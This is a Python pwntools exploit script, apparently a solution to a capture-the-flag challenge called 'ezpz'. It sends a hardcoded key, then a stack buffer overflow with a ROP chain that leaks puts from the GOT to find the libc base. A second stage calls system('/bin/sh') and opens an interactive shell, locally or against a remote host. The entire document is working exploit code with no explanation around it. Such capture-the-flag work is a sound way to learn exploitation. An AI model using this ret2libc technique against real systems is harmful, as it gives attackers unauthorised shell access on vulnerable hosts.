#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./ezpz"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *0x004015d3
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

key = b"0101000000001000000101010000101000000001000000000101000110100000000100000010101000000100000000100100001010100000001000000010101000101000000000000000101010010101000000000000000001010100010101000000"

# ROP chain
rop_pop_rdi_ret = 0x004015d3
elf_start_addr = 0x401110
payload = b""
payload += key
payload += b'A' * 4
payload += b'B' * 0x20
payload += p64(rop_pop_rdi_ret)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf_start_addr)
sleep(0.5)
p.sendline(payload)
# libc leak
p.recvline()
puts_libc_addr = u64(p.recvline().rstrip(b'\n') + b"\00\00")
log.info("puts@libc: " + hex(puts_libc_addr))
libc_base = puts_libc_addr - libc.symbols['puts']
log.info("libc base: " + hex(libc_base))

# Stage 2
rop_ret = 0x004015f4
binsh_libc_addr = 0x1d8698
payload = b""
payload += key
payload += b'A' * 4
payload += b'B' * 0x20
payload += p64(rop_pop_rdi_ret)
payload += p64(binsh_libc_addr + libc_base)
payload += p64(rop_ret)
payload += p64(libc.symbols['system'] + libc_base)
sleep(0.5)
p.sendline(payload)



p.interactive()
